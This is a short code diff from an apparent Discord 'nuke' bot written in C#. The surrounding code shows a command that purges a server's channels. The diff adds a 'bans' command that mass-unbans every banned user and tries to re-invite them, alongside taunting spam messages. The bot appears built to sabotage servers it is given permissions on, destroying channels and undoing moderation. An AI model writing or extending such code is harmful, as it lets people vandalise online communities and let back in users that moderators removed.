@@ -51,5 +51,13 @@ namespace REE6
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
             await PurgeActions.ChannelPurge(Context.Guild);
         }
+
+        [Command("bans")]
+        public async Task Unban()
+        {
+            await ReplyAsync("Unbanning and attempting to invite " + Context.Guild.GetBansAsync().Result.Count + " people");
+            await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
+            await PurgeActions.Unban(Context.Guild);
+        }
     }
 }
